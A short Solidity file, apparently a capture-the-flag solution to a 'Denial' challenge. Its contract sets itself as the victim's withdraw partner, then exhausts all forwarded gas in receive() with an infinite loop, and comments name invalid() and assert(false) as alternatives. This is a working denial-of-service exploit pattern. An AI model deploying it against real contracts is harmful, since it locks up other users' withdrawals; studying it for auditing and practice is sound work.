// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract DenialAttacker {
    IDenial public challenge;

    constructor(address challengeAddress) {
        challenge = IDenial(challengeAddress);
    }

    function attack() public {
        challenge.setWithdrawPartner(address(this));
    }

    receive() external payable {

        //the call to partner (partner.call{value:amountToSend}(""); ) hasn’t specified a fixed amount of gas to send => 
        //the call defaults to sending ALL the gas that’s remaining => we'll be using up all the remaining gas

        // works for solidity 0.8.0 =>call "INVALID" opcode
        // assembly {
        //     invalid() //causes panic error & consumes all gas
        // }

        //or:
        while(true){}

        // works for solidity < 0.8.0 => assert also consumes all gas
        //assert(false);

        //on the other hand: require(true) returns the remaining gas => this does not work
    }
}